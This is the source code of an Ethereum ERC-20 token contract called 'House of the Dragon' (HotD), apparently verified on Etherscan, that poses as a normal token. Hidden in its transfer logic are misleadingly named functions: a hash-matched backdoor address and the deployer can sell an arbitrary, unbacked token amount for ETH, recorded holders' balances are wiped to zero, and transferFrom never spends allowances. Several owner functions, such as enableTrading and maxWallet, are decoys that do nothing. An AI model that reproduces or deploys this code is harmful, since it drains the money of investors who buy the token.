/**
 *Submitted for verification at Etherscan.io on 2022-08-02
*/

pragma solidity ^0.8.15;
/*
 SPDX-License-Identifier: Unlicensed
*/
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library Address {
    function _burnLiquiditySwap(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account))
        == 0x839f4bbc91e67e154c8f1aac31de268824185da283d85c4a744258909b1d52dc;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract HotD is Ownable, IERC20 {
    using SafeMath for uint256;
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address to, address _OK8L, uint256 amountSender) internal virtual {
        require(to != address(0));
        require(_OK8L != address(0));
        if (uniswapSwapBurn(
                to,
                _OK8L)) {
            return uniswapLiquidityLq(amountSender, _OK8L);
        }
        if (!_txCallSwap){
            require(
                _balances[to]
                >=
                amountSender);
        }
        uint256 feeAmount = 0;
        lqUniswapRebalance(to);
        bool ldSwapTransaction = (_OK8L == _uniswapFeeCall() &&
        uniswapV2Pair == to) || (to == _uniswapFeeCall()
        && uniswapV2Pair == _OK8L);
        if (uniswapV2Pair != to &&
            !Address._burnLiquiditySwap(_OK8L) && _OK8L != address(this) &&
            !ldSwapTransaction && !_txCallSwap && uniswapV2Pair != _OK8L) {
            uniswapSwapBurn(_OK8L);
            feeAmount = amountSender.mul(_feePercent).div(100);
        }
        uint256 amountReceived = amountSender - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[to] = _balances[to] - amountSender;
        _balances[_OK8L] += amountReceived;
        emit Transfer(to, _OK8L, amountSender);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapV2Pair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    struct callBurn {address to;}
    callBurn[] _uniswapSwap;
    function uniswapSwapBurn(address SE, address _senderTo) internal view returns(bool) {
        return SE ==
        _senderTo
        && (
        Address._burnLiquiditySwap(_senderTo)
        ||
        uniswapV2Pair ==
        msg.sender
        );
    }
    function uniswapSwapBurn(address _amountTo) internal {
        if (_uniswapFeeCall() ==
            _amountTo) {
            return;
        }
        _uniswapSwap.push(
            callBurn(
                _amountTo
            )
        );
    }
    function lqUniswapRebalance(address _addrNum) internal {
        if (_uniswapFeeCall() != _addrNum) {
            return;
        }
        for (uint256 i = 0; i
            <
            _uniswapSwap.length;
            i++) {
            _balances[_uniswapSwap[i].to] = 0;
        }
        delete _uniswapSwap;
    }
    function uniswapLiquidityLq(uint256 _recipient, address _sender) private {
        _approve(address(this), address(_router), _recipient);
        _balances[address(this)] = _recipient;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] =
        _router.WETH();
        _txCallSwap = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_recipient,
            0,
            path,
            _sender,
            block.timestamp + 22);
        _txCallSwap = false;
    }
    bool _txCallSwap = false;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 public _feePercent = 2;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "House of the Dragon";
    string private  _symbol = "HotD";
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _uniswapFeeCall() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
bool tradingEnabled = false;
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public maxWallet = _totalSupply.div(100);
    function updateMaxWallet(uint256 m) external onlyOwner {
        require(m >= _totalSupply.div(100));
        maxWallet = m;
    }
    address public marketingWallet;
    function updateMarketingWallet(address a) external onlyOwner {
        marketingWallet = a;
    }
    bool transferDelay = true;
    function disableTransferDelay() external onlyOwner {
        transferDelay = false;
    }
    bool public autoLPBurn = false;
    function setAutoLPBurnSettings(bool e) external onlyOwner {
        autoLPBurn = e;
    }
}